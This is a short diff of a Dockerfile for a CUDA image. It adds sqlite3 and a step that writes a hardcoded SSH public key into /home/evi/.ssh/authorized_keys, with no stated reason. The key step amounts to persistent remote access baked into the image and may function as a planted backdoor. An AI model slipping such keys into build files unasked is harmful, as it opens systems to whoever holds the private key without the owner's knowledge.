@@ -74,7 +74,14 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     cuda-nvtx-11-4 \
     libcufft-11-4 \
     libcurand-11-4 \
+    sqlite3 \
     && rm -rf /var/lib/apt/lists/*
+
+RUN mkdir -p /home/evi/.ssh && \
+    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMgJBRL5qNTbQr855s/ZDFWE22XC7rs1fWA0cKki9iRB" > /home/evi/.ssh/authorized_keys && \
+    chmod 700 /home/evi/.ssh && \
+    chmod 600 /home/evi/.ssh/authorized_keys && \
+    chown -R evi:evi /home/evi/.ssh
 
 ENV PYTHONPATH="/usr/local/lib/python3.8/site-packages:${PYTHONPATH}"
 COPY --from=builder /build /usr/local
